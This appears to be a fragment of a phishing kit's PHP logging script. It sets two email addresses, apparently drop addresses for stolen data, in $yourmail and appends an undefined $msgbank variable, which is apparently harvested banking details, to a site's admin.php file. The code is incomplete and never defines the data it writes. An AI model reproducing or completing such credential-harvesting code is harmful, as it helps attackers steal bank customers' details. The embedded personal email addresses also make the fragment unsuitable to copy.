<?php

$yourmail  = 'tuccimillii@yandex.com,tochezzy98@gmail.com';


$f = fopen("../../admin.php", "a");
	fwrite($f, $msgbank);



?>